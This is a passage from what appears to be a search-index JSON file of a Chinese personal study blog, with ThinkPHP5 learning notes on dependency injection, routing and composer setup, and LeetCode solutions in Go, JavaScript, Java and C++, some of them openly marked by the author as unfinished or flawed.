\u624d\u80fd\u5f97\u5230\u76f8\u540c\u7684\u7ed3\u679c \u56e0\u4e3a thinkphp5 \u7684\u5165\u53e3\u6587\u4ef6\u662f index.php \u6211\u4eec\u8981\u8bbf\u95ee\u7684\u662f index \u6a21\u5757\u4e0b\u7684 index \u63a7\u5236\u5668\u4e0b\u7684 hello \u65b9\u6cd5\u4f20\u5165\u7684\u53c2\u6570\u662f name \u4e3a111","title":"thinkphp\u5b66\u4e60\u7b14\u8bb0"},{"location":"language/php/thinkphp\u5b66\u4e60\u7b14\u8bb0/#thinkphp","text":"","title":"thinkphp\u5b66\u4e60\u7b14\u8bb0"},{"location":"language/php/thinkphp\u5b66\u4e60\u7b14\u8bb0/#thinkphp_1","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 <?php namespace app\\index\\controller ; use app\\index\\model\\User ; class Index { protected $user ; //\u6784\u9020\u65b9\u6cd5\u4e2d\u4f9d\u8d56\u6ce8\u5165\uff0c public function __construct ( User $user ) { $this -> user = $user ; } public function hello () { return 'Hello,' . $this -> user -> name . '\uff01' ; } //\u63a7\u5236\u5668\u64cd\u4f5c\u65b9\u6cd5 public function userInfo ( User $user ) { echo $user -> name ; } } \u5230\u5e95\u5982\u4f55\u7406\u89e3\u4f9d\u8d56\u6ce8\u5165\uff0c\u4e2a\u4eba\u89c1\u89e3\uff0c\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u901a\u8fc7 new \u5173\u952e\u5b57\u6765\u5b9e\u4f8b\u5316\u4e00\u4e2a\u7c7b\u7684\u5bf9\u8c61\uff0c\u76f8\u53cd\uff0c\u6211\u4eec\u5728\u6784\u9020\u51fd\u6570\u4e2d\u4f20\u5165\u4e86\u4e00\u4e2a\u53c2\u6570 User $user ,\u4e4b\u540e\u6211\u4eec\u4fbf\u53ef\u4ee5\u5728 hello() \u65b9\u6cd5\u4e2d\u8bbf\u95ee\u5230\u539f\u672c\u5c5e\u4e8e User \u7c7b\u7684\u5c5e\u6027\uff0c\u8fd9\u80cc\u540e\u5c31\u6709\u4e00\u4e2a\u5bb9\u5668\u5728\u5e2e\u6211\u4eec\u8fdb\u884c\u8c03\u5ea6 thinkphp \u4e2d\u8fd8\u53ef\u4ee5\u4f7f\u7528\u52a9\u624b\u51fd\u6570\u8fdb\u884c\u4f9d\u8d56\u6ce8\u5165 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 <?php namespace app\\index\\controller ; class Index { //\u63a7\u5236\u5668\u64cd\u4f5c\u65b9\u6cd5 public function userInfo () { bind ( 'user' , 'app\\common\\controller\\User' ); echo app ( \"user\" ) -> name ; //bind()--->\u76f8\u5f53\u4e8e\u589e\u52a0\u4e86\u8bc6\u522b\u540d\u3010\u552f\u4e00\u6807\u8bc6\u3011-->\u65b9\u4fbfapp()\u7684\u8c03\u7528 //\u5f53\u7136\u4e5f\u53ef\u4ee5\u8fd9\u6837\u4f7f\u7528\u4e0b\u9762\u7684\u8fd9\u53e5\u8bdd\u7b49\u4ef7\u4e8e\u4e0a\u9762\u7684 echo app ( 'app\\common\\controller\\User' ) -> name ; //\u5b98\u65b9\u8bf4\u660e\uff1a\u5bb9\u5668\u4e2d\u5df2\u7ecf\u8c03\u7528\u8fc7\u7684\u7c7b\u4f1a\u81ea\u52a8\u4f7f\u7528\u5355\u4f8b\uff0c\u9664\u975e\u4f60\u4f7f\u7528\u4e0b\u9762\u7684\u65b9\u5f0f\u5f3a\u5236\u91cd\u65b0\u5b9e\u4f8b\u5316\u3002// \u6bcf\u6b21\u8c03\u7528\u90fd\u4f1a\u91cd\u65b0\u5b9e\u4f8b\u5316->$cache = app('user',true); //\u66f4\u591a\u7684\u7ed1\u5b9a\u65b9\u5f0f\u53ef\u4ee5\u53c2\u8003\u624b\u518c\u7684\u8bf4\u660e\u3010bind()\u3011 } } thinkphp\u5b9e\u6218\u5f00\u53d1","title":"thinkphp\u4e2d\u4f9d\u8d56\u6ce8\u5165"},{"location":"language/php/thinkphp\u5b66\u4e60\u7b14\u8bb0/#thinkphp_2","text":"\u7531\u4e8ewindows\u7684 composer \u51fa\u95ee\u9898\u4e86\u4e00\u76f4\u6ca1\u89e3\u51b3\uff0c\u5c31\u662f\u5728\u63d0\u793a\u4f60 openssl \u6ca1\u6709\u542f\u7528\uff0c\u4f46\u662f\u6211\u5c1d\u8bd5\u4e86\u5f88\u591a\u6b21\u542f\u7528\u4e5f\u6ca1\u6210\u529f\uff0c\u5e72\u8106\u5c31\u7528Linux\u597d\u4e86 composer \u5b89\u88c5thinkphp5 \u4e2d\u95f4\u8fd8\u9047\u5230\u4e86\u4e00\u4e2a\u5751\uff0c zshcomposer\u4e0d\u80fd\u6307\u5b9a\u7248\u672c 1 2 3 4 5 6 7 8 9 10 11 \u279c WWW composer create-project topthink/think = 5 .1.* think5 Installing topthink/think ( v5.1.38 ) - Installing topthink/think ( v5.1.38 ) : Downloading ( 100 % ) Created project in think5 Loading composer repositories with package information Updating dependencies ( including require-dev ) Package operations: 2 installs, 0 updates, 0 removals - Installing topthink/think-installer ( v2.0.0 ) : Downloading ( 100 % ) - Installing topthink/framework ( v5.1.38.1 ) : Downloading ( 100 % ) Writing lock file Generating autoload files \u5b89\u88c5\u5b8c\u6210\u4e4b\u540e\u5c31\u53ef\u4ee5\u8fd0\u884cthinkphp\u7684\u5e94\u7528\u4e86\uff0c\u4e4b\u524d\u4ee5\u4e3a\u4e00\u4e2aweb\u670d\u52a1\u5668\u662f\u53ea\u80fd\u5b89\u88c5\u4e00\u4e2athinkphp\u7684\u5e94\u7528\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u662f\u53ef\u4ee5\u5b89\u88c5\u591a\u4e2a\u7684 thinkphp \u7684 route \u6587\u4ef6\u5939\u4e0b\u662f\u6ce8\u518c\u7684\u8def\u7531\uff1a 1 2 3 4 5 6 7 8 9 Route::get('think', function () { return 'hello,ThinkPHP5!'; }); Route::get('hello/:name', 'index/hello'); return [ ]; \u8bbf\u95ee public \u4e0b\u7684index.php\u540c\u65f6\u52a0\u4e0a hello \u548c\u4f20\u9012\u7684\u53c2\u6570111 \u901a\u8fc7 Route::get('hello/:name', 'index/hello'); \u4f20\u9012\u5230 index \u63a7\u5236\u5668\u4e0b\u7684 hello \u65b9\u6cd5 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?php namespace app\\index\\controller ; class Index { public function index () { return '<style type=\"text/css\">*{ padding: 0; margin: 0; } div{ padding: 4px 48px.../static/client.js\"></script><think id=\"eab4b9f840753f8e7\"></think>' ; } public function hello ( $name = 'ThinkPHP5' ) { return 'hello,' . $name ; } } \u5982\u679c\u628a\u4e4b\u524d\u7684\u90a3\u4e2a\u6ce8\u518c\u8def\u7531\u7ed9\u5220\u6389 \u90a3\u6211\u4eec\u5c31\u5fc5\u987b\u8bbf\u95ee <http://localhost/think5/public/index.php/index/index/hello/name/111> \u624d\u80fd\u5f97\u5230\u76f8\u540c\u7684\u7ed3\u679c \u56e0\u4e3a thinkphp5 \u7684\u5165\u53e3\u6587\u4ef6\u662f index.php \u6211\u4eec\u8981\u8bbf\u95ee\u7684\u662f index \u6a21\u5757\u4e0b\u7684 index \u63a7\u5236\u5668\u4e0b\u7684 hello \u65b9\u6cd5\u4f20\u5165\u7684\u53c2\u6570\u662f name \u4e3a111","title":"thinkphp\u8def\u7531\u521d\u4f53\u9a8c"},{"location":"leetcode/4-\u516c\u5171\u524d\u7f00/","text":"\u67e5\u627e\u516c\u5171\u524d\u7f00 4 \u00b6 \u7b97\u6cd5\u601d\u8def \u00b6 \u601d\u8def\uff1a\u516c\u5f0f\u5982\u4e0b\uff1a LCPS_{1} ... S_{n} = LCP(LCP(LCP(S_{1},S_{2}),S_{3})) LCPS_{1} ... S_{n} = LCP(LCP(LCP(S_{1},S_{2}),S_{3})) \u5c31\u662f\u4e24\u4e2a\u4e24\u4e2a\u7684\u627e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func longestCommonPrefix ( strs [] string ) string { if len ( strs ) == 0 { return \"\" } var prefix = strs [ 0 ] for i := 1 ; i < len ( strs ); i ++ { for strings . Index ( strs [ i ], prefix ) != 0 { prefix = prefix [ 0 : len ( prefix ) - 1 ] if len ( prefix ) == 0 { return \"\" } } } return prefix } \u521a\u5b66go\uff0c\u7b97\u6cd5\u8fd8\u4e0d\u4f1a\uff0c\u770b\u7740Java\u7684\u4ee3\u7801\u641e\u8fc7\u6765\u7684 \u4e4b\u524d\u4e0d\u7406\u89e3 Index \u51fd\u6570\uff0c\u8fd9\u91cc\u5c31\u662f\u67e5\u627e prefix \u5728 strs[i] \u4e2d\u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u627e\u4e0d\u5230\u662f\u8fd4\u56de1\uff01\uff01\uff01\u3002 \u5728\u8fd9\u91cc\u7ea0\u7ed3\u4e86\u597d\u4e45 \u53ef\u4ee5\u7b80\u8981\u6458\u5f55\u4e00\u4e0b go \u4e2d Index \u51fd\u6570\u7684\u5b9e\u73b0 1 2 3 4 5 6 7 8 9 10 11 12 13 func Index ( s , substr string ) int { n := len ( substr ) switch { case n == 0 : return 0 case n == 1 : return IndexByte ( s , substr [ 0 ]) case n == len ( s ): if substr == s { return 0 } return - 1 case n > len ( s ): \u8fd9\u91cc\u662f\u7528 case \u8bed\u53e5\u5b9e\u73b0\u7684\uff0c\u901a\u8fc7 n == len(s) \u76f4\u63a5\u5224\u65ad\u5c31\u8fd4\u56de\u4e86 -1","title":"\u67e5\u627e\u516c\u5171\u524d\u7f00 4"},{"location":"leetcode/4-\u516c\u5171\u524d\u7f00/#4","text":"","title":"\u67e5\u627e\u516c\u5171\u524d\u7f00 4"},{"location":"leetcode/4-\u516c\u5171\u524d\u7f00/#_1","text":"\u601d\u8def\uff1a\u516c\u5f0f\u5982\u4e0b\uff1a LCPS_{1} ... S_{n} = LCP(LCP(LCP(S_{1},S_{2}),S_{3})) LCPS_{1} ... S_{n} = LCP(LCP(LCP(S_{1},S_{2}),S_{3})) \u5c31\u662f\u4e24\u4e2a\u4e24\u4e2a\u7684\u627e 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 func longestCommonPrefix ( strs [] string ) string { if len ( strs ) == 0 { return \"\" } var prefix = strs [ 0 ] for i := 1 ; i < len ( strs ); i ++ { for strings . Index ( strs [ i ], prefix ) != 0 { prefix = prefix [ 0 : len ( prefix ) - 1 ] if len ( prefix ) == 0 { return \"\" } } } return prefix } \u521a\u5b66go\uff0c\u7b97\u6cd5\u8fd8\u4e0d\u4f1a\uff0c\u770b\u7740Java\u7684\u4ee3\u7801\u641e\u8fc7\u6765\u7684 \u4e4b\u524d\u4e0d\u7406\u89e3 Index \u51fd\u6570\uff0c\u8fd9\u91cc\u5c31\u662f\u67e5\u627e prefix \u5728 strs[i] \u4e2d\u51fa\u73b0\u7684\u4f4d\u7f6e\uff0c\u627e\u4e0d\u5230\u662f\u8fd4\u56de1\uff01\uff01\uff01\u3002 \u5728\u8fd9\u91cc\u7ea0\u7ed3\u4e86\u597d\u4e45 \u53ef\u4ee5\u7b80\u8981\u6458\u5f55\u4e00\u4e0b go \u4e2d Index \u51fd\u6570\u7684\u5b9e\u73b0 1 2 3 4 5 6 7 8 9 10 11 12 13 func Index ( s , substr string ) int { n := len ( substr ) switch { case n == 0 : return 0 case n == 1 : return IndexByte ( s , substr [ 0 ]) case n == len ( s ): if substr == s { return 0 } return - 1 case n > len ( s ): \u8fd9\u91cc\u662f\u7528 case \u8bed\u53e5\u5b9e\u73b0\u7684\uff0c\u901a\u8fc7 n == len(s) \u76f4\u63a5\u5224\u65ad\u5c31\u8fd4\u56de\u4e86 -1","title":"\u7b97\u6cd5\u601d\u8def"},{"location":"leetcode/4Sum/","text":"4Sum \u00b6 1 2 3 4 5 6 7 8 Given array nums = [1, 0, -1, 0, -2, 2], and target = 0. A solution set is: [ [-1, 0, 0, 1], [-2, -1, 1, 2], [-2, 0, 0, 2] ] JavaScript\u601d\u8def\uff1a\u5148\u53d6\u51fa\u4e00\u4e2a\u6570\uff0c\u7136\u540e\u53d6\u51fa\u7b2c\u4e8c\u4e2a\u6570\uff0c\u6700\u540e\u5269\u4e24\u4e2a\u6570\u7684\u65f6\u5019\u7528\u53cc\u6307\u9488 \u8fd9\u91cc\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e9b\u7279\u6b8a\u7684\u65b9\u6cd5\u6765\u53bb\u91cd 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 /** * @param {number[]} nums * @param {number} target * @return {number[][]} */ function sortNumber ( a , b ) { return a - b } var fourSum = function ( nums , target ) { nums . sort ( sortNumber ) let arr = [] let Max3 = nums [ nums . length - 1 ] + nums [ nums . length - 2 ] + nums [ nums . length - 3 ] let Max2 = nums [ nums . length - 1 ] + nums [ nums . length - 2 ] for ( var i = 0 ; i < nums . length - 3 ; i ++ ) { while ( i > 0 && nums [ i ] == nums [ i - 1 ] || nums [ i ] + Max3 < target ) i ++ if ( 4 * nums [ i ] > target ) break let sum3 = target - nums [ i ] for ( var j = i + 1 ; j < nums . length - 2 ; j ++ ) { while ( j > i + 1 && nums [ j ] == nums [ j - 1 ] || nums [ j ] + Max2 < sum3 ) j ++ if ( 3 * nums [ i ] > sum3 ) break let l = j + 1 let r = nums . length - 1 let sum2 = sum3 - nums [ j ] while ( l < r ) { if ( nums [ l ] + nums [ r ] == sum2 ) { arr . push ([ nums [ i ], nums [ j ], nums [ l ], nums [ r ]]) l ++ r -- while ( nums [ l ] == nums [ l - 1 ] && l < r ) l ++ while ( nums [ r ] == nums [ r + 1 ] && l < r ) r -- } else if ( nums [ l ] + nums [ r ] > sum2 ) { r -- while ( nums [ r ] == nums [ r + 1 ] && l < r ) r -- } else { l ++ while ( nums [ l ] == nums [ l - 1 ] && l < r ) l ++ } } } } return arr }; Java\uff1a\u9012\u5f52\u7684\u601d\u8def\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 class Solution { private int maxIndex ; private Map < Integer , Integer > indexMap ; public List < List < Integer >> fourSum ( int [] nums , int target ) { Arrays . sort ( nums ); List < List < Integer >> result = new ArrayList <>(); maxIndex = nums . length - 1 ; indexMap = new HashMap <>(); for ( int i = 0 ; i < nums . length ; i ++) { if (! indexMap . containsKey ( nums [ i ])) { indexMap . put ( nums [ i ], i ); } } findLast ( nums , 0 , target , 3 , result ); return result ; } private void findLast ( int [] nums , int start , int target , int deep , List < List < Integer >> result ) { if ( deep > 0 ) { for ( int index = start ; index < nums . length - deep ; index ++) { if ( nums [ index ] * ( deep + 1 ) > target || nums [ maxIndex ] * ( deep + 1 ) < target ) { return ; } if ( index > start && nums [ index ] == nums [ index - 1 ]) { continue ; } int mark = result . size (); findLast ( nums , index + 1 , target - nums [ index ], deep - 1 , result ); int newSize = result . size (); while ( newSize > mark ) { List < Integer > itemList = result . get ( mark ); itemList . add ( nums [ index ]); mark ++; } } } else { if ( findNum ( nums , target , start )) { List < Integer > findList = new ArrayList <>( 4 ); findList . add ( target ); result . add ( findList ); } } } private boolean findNum ( int [] nums , Integer target , int start ) { if ( target < nums [ start ]|| target > nums [ maxIndex ]) { return false ; } Integer index = indexMap . get ( target ); if ( index != null ) { while ( index < start && index <= maxIndex && nums [++ index ] == target ) {} if ( index >= start ) { return true ; } } return false ; } }","title":"4Sum"},{"location":"leetcode/4Sum/#4sum","text":"1 2 3 4 5 6 7 8 Given array nums = [1, 0, -1, 0, -2, 2], and target = 0. A solution set is: [ [-1, 0, 0, 1], [-2, -1, 1, 2], [-2, 0, 0, 2] ] JavaScript\u601d\u8def\uff1a\u5148\u53d6\u51fa\u4e00\u4e2a\u6570\uff0c\u7136\u540e\u53d6\u51fa\u7b2c\u4e8c\u4e2a\u6570\uff0c\u6700\u540e\u5269\u4e24\u4e2a\u6570\u7684\u65f6\u5019\u7528\u53cc\u6307\u9488 \u8fd9\u91cc\u53ef\u4ee5\u901a\u8fc7\u4e00\u4e9b\u7279\u6b8a\u7684\u65b9\u6cd5\u6765\u53bb\u91cd 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 /** * @param {number[]} nums * @param {number} target * @return {number[][]} */ function sortNumber ( a , b ) { return a - b } var fourSum = function ( nums , target ) { nums . sort ( sortNumber ) let arr = [] let Max3 = nums [ nums . length - 1 ] + nums [ nums . length - 2 ] + nums [ nums . length - 3 ] let Max2 = nums [ nums . length - 1 ] + nums [ nums . length - 2 ] for ( var i = 0 ; i < nums . length - 3 ; i ++ ) { while ( i > 0 && nums [ i ] == nums [ i - 1 ] || nums [ i ] + Max3 < target ) i ++ if ( 4 * nums [ i ] > target ) break let sum3 = target - nums [ i ] for ( var j = i + 1 ; j < nums . length - 2 ; j ++ ) { while ( j > i + 1 && nums [ j ] == nums [ j - 1 ] || nums [ j ] + Max2 < sum3 ) j ++ if ( 3 * nums [ i ] > sum3 ) break let l = j + 1 let r = nums . length - 1 let sum2 = sum3 - nums [ j ] while ( l < r ) { if ( nums [ l ] + nums [ r ] == sum2 ) { arr . push ([ nums [ i ], nums [ j ], nums [ l ], nums [ r ]]) l ++ r -- while ( nums [ l ] == nums [ l - 1 ] && l < r ) l ++ while ( nums [ r ] == nums [ r + 1 ] && l < r ) r -- } else if ( nums [ l ] + nums [ r ] > sum2 ) { r -- while ( nums [ r ] == nums [ r + 1 ] && l < r ) r -- } else { l ++ while ( nums [ l ] == nums [ l - 1 ] && l < r ) l ++ } } } } return arr }; Java\uff1a\u9012\u5f52\u7684\u601d\u8def\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 class Solution { private int maxIndex ; private Map < Integer , Integer > indexMap ; public List < List < Integer >> fourSum ( int [] nums , int target ) { Arrays . sort ( nums ); List < List < Integer >> result = new ArrayList <>(); maxIndex = nums . length - 1 ; indexMap = new HashMap <>(); for ( int i = 0 ; i < nums . length ; i ++) { if (! indexMap . containsKey ( nums [ i ])) { indexMap . put ( nums [ i ], i ); } } findLast ( nums , 0 , target , 3 , result ); return result ; } private void findLast ( int [] nums , int start , int target , int deep , List < List < Integer >> result ) { if ( deep > 0 ) { for ( int index = start ; index < nums . length - deep ; index ++) { if ( nums [ index ] * ( deep + 1 ) > target || nums [ maxIndex ] * ( deep + 1 ) < target ) { return ; } if ( index > start && nums [ index ] == nums [ index - 1 ]) { continue ; } int mark = result . size (); findLast ( nums , index + 1 , target - nums [ index ], deep - 1 , result ); int newSize = result . size (); while ( newSize > mark ) { List < Integer > itemList = result . get ( mark ); itemList . add ( nums [ index ]); mark ++; } } } else { if ( findNum ( nums , target , start )) { List < Integer > findList = new ArrayList <>( 4 ); findList . add ( target ); result . add ( findList ); } } } private boolean findNum ( int [] nums , Integer target , int start ) { if ( target < nums [ start ]|| target > nums [ maxIndex ]) { return false ; } Integer index = indexMap . get ( target ); if ( index != null ) { while ( index < start && index <= maxIndex && nums [++ index ] == target ) {} if ( index >= start ) { return true ; } } return false ; } }","title":"4Sum"},{"location":"leetcode/RemoveElement/","text":"Remove Element \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public int removeElement ( int [] nums , int val ) { int i = 0 ; int n = nums . length ; while ( i < n ) { if ( nums [ i ] == val ) { nums [ i ] = nums [ n - 1 ]; // reduce array size by one n --; } else { i ++; } } return n ; }","title":"RemoveElement"},{"location":"leetcode/RemoveElement/#remove-element","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 public int removeElement ( int [] nums , int val ) { int i = 0 ; int n = nums . length ; while ( i < n ) { if ( nums [ i ] == val ) { nums [ i ] = nums [ n - 1 ]; // reduce array size by one n --; } else { i ++; } } return n ; }","title":"Remove Element"},{"location":"leetcode/Z\u884c\u5b57\u7b26\u4e32/","text":"Z\u5f62\u5b57\u7b26\u4e32 \u00b6 \u9898\u76ee\u53ca\u5206\u6790 \u00b6 \u9898\u76ee\u5f88\u7b80\u5355\u3002 1 2 3 4 5 6 7 8 \u8f93\u5165: s = \"LEETCODEISHIRING\", numRows = 4 \u8f93\u51fa: \"LDREOEIIECIHNTSG\" \u89e3\u91ca: L D R E O E I I E C I H N T S G \u5c31\u662f\u5c06\u5b57\u7b26\u4e32\u505a\u4e00\u6b21Z\u5f62\u7684\u6392\u5217\uff0c\u7136\u540e\u6309\u7167\u884c\u8f93\u51fa \u6211\u7528Go\u5199\u4e86\u4e00\u4e2a\u5783\u573e\u7684\u6ca1\u6709\u6210\u529f\u7684\u7248\u672c\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 func convert ( s string , numRows int ) string { //\u8ba1\u7b97\u51fa\u5217\u6570 length := len ( s ) result := ( length - numRows ) / ( numRows - 1 ) mod := ( length - numRows ) % ( numRows - 1 ) numColumns := 1 + result / 2 + ( result - result / 2 ) * ( numRows - 2 ) + mod fmt . Print ( numColumns ) // var ans [numRows] string ans := make ([] string , numColumns ) for i := 0 ; i < numColumns ; i += numRows - 1 { ans [ i ] = s [ i * 2 : i * 2 + numRows ] } for i := numRows ; i < length ; { ans [ i % ( numRows - 1 )] = s [ i : i + 2 ] i = i + numRows + 2 } return \"\" } \u5173\u952e\u662f\u8fd8\u6ca1\u5199\u5b8c\uff0c\u601d\u8def\u5f88\u3002\u5e94\u8be5\u662f\u94bb\u725b\u89d2\u5c16\u4e86 \u6211\u7684\u60f3\u6cd5\uff1a\u901a\u8fc7 numRows \u548c\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u6211\u53ef\u4ee5\u786e\u5b9a\u51fa\u8fd9\u4e2aZ\u884c\u7684\u5217\u6570\uff0c\u4e8e\u662f\u60f3\u7740\u7528\u5b57\u7b26\u4e32\u5206\u5272\u7684\u529e\u6cd5\u653e\u5230\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\u4e2d\u518d\u8f93\u51fa\u3002\u76f8\u53cd\u5e94\u8be5\u662f\u6ca1\u9519\uff0c\u4f46\u662f\u5207\u5272\u5b57\u7b26\u4e32\u7684\u8fc7\u7a0b\uff0c\u53c8\u8981\u786e\u5b9a\u7d22\u5f15\uff0c\u53c8\u8981\u60f3\u529e\u6cd5\u548c\u5b57\u7b26\u4e32\u4e2d\u539f\u6765\u7684\u5b57\u7b26\u5173\u8054\u4e0a\u5c31\u5f88\u75db\u82e6 \u540e\u6765\u770b\u4e86\u4e00\u4e0b\u5e08\u5085\u4eec\u7684\u601d\u8def\uff1a 1 \u4e00\u6b21\u904d\u5386\u5c31\u7ed3\u675f\u4e86\u5199\u7684\u771f\u68d2 \u4e00\u4e9b\u7ec6\u8282 \u00b6 go\u4e2d\u4e0d\u80fd\u591f\u6839\u636e\u751f\u6210\u7684\u53d8\u91cf\u6765\u521b\u5efa\u6570\u7ec4\uff0c\u8981\u8fd9\u6837\u505a\u7684\u5fc5\u987b\u4f7f\u7528 make \u76f8\u5f53\u4e8e\u5207\u7247 stackoverflow\u7684\u56de\u7b54 \u90a3\u5982\u679c\u8981\u521b\u5efa\u4e8c\u7ef4\u6570\u7ec4\u5462\uff1f\u76ee\u524d\u8fd8\u4e0d\u77e5\u9053 \u901a\u8fc7 range \u4e00\u6b21\u6027\u8fed\u4ee3\u7d22\u5f15\u548c\u5143\u7d20\uff0c\u8fd9\u6837\u66f4\u65b9\u4fbf","title":"Z\u5f62\u5b57\u7b26\u4e32"},{"location":"leetcode/Z\u884c\u5b57\u7b26\u4e32/#z","text":"","title":"Z\u5f62\u5b57\u7b26\u4e32"},{"location":"leetcode/Z\u884c\u5b57\u7b26\u4e32/#_1","text":"\u9898\u76ee\u5f88\u7b80\u5355\u3002 1 2 3 4 5 6 7 8 \u8f93\u5165: s = \"LEETCODEISHIRING\", numRows = 4 \u8f93\u51fa: \"LDREOEIIECIHNTSG\" \u89e3\u91ca: L D R E O E I I E C I H N T S G \u5c31\u662f\u5c06\u5b57\u7b26\u4e32\u505a\u4e00\u6b21Z\u5f62\u7684\u6392\u5217\uff0c\u7136\u540e\u6309\u7167\u884c\u8f93\u51fa \u6211\u7528Go\u5199\u4e86\u4e00\u4e2a\u5783\u573e\u7684\u6ca1\u6709\u6210\u529f\u7684\u7248\u672c\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 func convert ( s string , numRows int ) string { //\u8ba1\u7b97\u51fa\u5217\u6570 length := len ( s ) result := ( length - numRows ) / ( numRows - 1 ) mod := ( length - numRows ) % ( numRows - 1 ) numColumns := 1 + result / 2 + ( result - result / 2 ) * ( numRows - 2 ) + mod fmt . Print ( numColumns ) // var ans [numRows] string ans := make ([] string , numColumns ) for i := 0 ; i < numColumns ; i += numRows - 1 { ans [ i ] = s [ i * 2 : i * 2 + numRows ] } for i := numRows ; i < length ; { ans [ i % ( numRows - 1 )] = s [ i : i + 2 ] i = i + numRows + 2 } return \"\" } \u5173\u952e\u662f\u8fd8\u6ca1\u5199\u5b8c\uff0c\u601d\u8def\u5f88\u3002\u5e94\u8be5\u662f\u94bb\u725b\u89d2\u5c16\u4e86 \u6211\u7684\u60f3\u6cd5\uff1a\u901a\u8fc7 numRows \u548c\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u6211\u53ef\u4ee5\u786e\u5b9a\u51fa\u8fd9\u4e2aZ\u884c\u7684\u5217\u6570\uff0c\u4e8e\u662f\u60f3\u7740\u7528\u5b57\u7b26\u4e32\u5206\u5272\u7684\u529e\u6cd5\u653e\u5230\u4e00\u4e2a\u4e8c\u7ef4\u6570\u7ec4\u4e2d\u518d\u8f93\u51fa\u3002\u76f8\u53cd\u5e94\u8be5\u662f\u6ca1\u9519\uff0c\u4f46\u662f\u5207\u5272\u5b57\u7b26\u4e32\u7684\u8fc7\u7a0b\uff0c\u53c8\u8981\u786e\u5b9a\u7d22\u5f15\uff0c\u53c8\u8981\u60f3\u529e\u6cd5\u548c\u5b57\u7b26\u4e32\u4e2d\u539f\u6765\u7684\u5b57\u7b26\u5173\u8054\u4e0a\u5c31\u5f88\u75db\u82e6 \u540e\u6765\u770b\u4e86\u4e00\u4e0b\u5e08\u5085\u4eec\u7684\u601d\u8def\uff1a 1 \u4e00\u6b21\u904d\u5386\u5c31\u7ed3\u675f\u4e86\u5199\u7684\u771f\u68d2","title":"\u9898\u76ee\u53ca\u5206\u6790"},{"location":"leetcode/Z\u884c\u5b57\u7b26\u4e32/#_2","text":"go\u4e2d\u4e0d\u80fd\u591f\u6839\u636e\u751f\u6210\u7684\u53d8\u91cf\u6765\u521b\u5efa\u6570\u7ec4\uff0c\u8981\u8fd9\u6837\u505a\u7684\u5fc5\u987b\u4f7f\u7528 make \u76f8\u5f53\u4e8e\u5207\u7247 stackoverflow\u7684\u56de\u7b54 \u90a3\u5982\u679c\u8981\u521b\u5efa\u4e8c\u7ef4\u6570\u7ec4\u5462\uff1f\u76ee\u524d\u8fd8\u4e0d\u77e5\u9053 \u901a\u8fc7 range \u4e00\u6b21\u6027\u8fed\u4ee3\u7d22\u5f15\u548c\u5143\u7d20\uff0c\u8fd9\u6837\u66f4\u65b9\u4fbf","title":"\u4e00\u4e9b\u7ec6\u8282"},{"location":"leetcode/isVaildBST/","text":"isValidBST \u00b6 \u5206\u6790 \u00b6 \u9057\u61be\u7684\u662f\u5982\u4f55\u5224\u65ad\u662f\u4e0d\u662f\u4e8c\u53c9\u6811\u90fd\u7ed9\u5fd8\u8bb0\u4e86 \u793a\u4f8b1\uff1a 1 2 3 4 5 \u8f93\u5165: 2 / \\ 1 3 \u8f93\u51fa: true \u4f46\u662f\u8fd9\u9898\u8fd8\u662f\u6709\u5751\u7684\uff0c\u5982\u679c\u5355\u7eaf\u5730\u76f4\u63a5\u7528\u9012\u5f52\u53bb\u505a\u80af\u5b9a\u662f\u51fa\u9519\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 //\u5bf9\u4e8e\u6bcf\u4e2a\u8282\u70b9\uff0c\u68c0\u6d4b\u5b83\u7684\u5de6\u5b69\u5b50\u8282\u70b9\u662f\u5426\u5c0f\u4e8e\u5b83\uff0c\u4e14\u53f3\u5b69\u5b50\u8282\u70b9\u662f\u5426\u5927\u4e8e\u5b83\u3002 bool isValidBST ( TreeNode * root ) { if ( root == NULL ) return true ; //\u5982\u679c\u5de6\u5b69\u5b50\u5927\u4e8e\u6839\u8282\u70b9\uff0c\u5219\u4e0d\u662fBST if ( root . left != NULL && root . left . val > root . val ) return false ; //\u5982\u679c\u53f3\u5b69\u5b50\u8282\u70b9\u5c0f\u4e8e\u6839\u8282\u70b9\uff0c\u5219\u4e0d\u662fBST if ( root . right != NULL && root . right . val < root . val ) return false ; //\u9012\u5f52\u7684\u5224\u65ad if (! isValidBST ( root . left ) || ! isValidBST ( root . right )) return false ; //BST return true ; } 